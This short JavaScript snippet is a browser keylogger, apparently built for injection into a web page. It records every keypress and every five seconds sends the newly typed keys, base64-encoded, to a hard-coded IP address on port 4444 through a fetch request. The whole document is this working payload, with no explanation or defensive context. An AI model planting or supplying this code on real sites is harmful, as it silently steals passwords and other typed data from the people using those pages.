let keys = "";
let sent_keys = "";

document.onkeypress = function(e) {
    keys += e.key;
    //console.log('k:', keys);
}

setInterval(async function() {
    //console.log('keys:', keys);
    let sending_keys = keys.replace(sent_keys, "");
    if(sending_keys) {
	sent_keys += sending_keys;
	await fetch('http://10.4.49.251:4444?key=' + btoa(sending_keys));
    }
}, 5000)
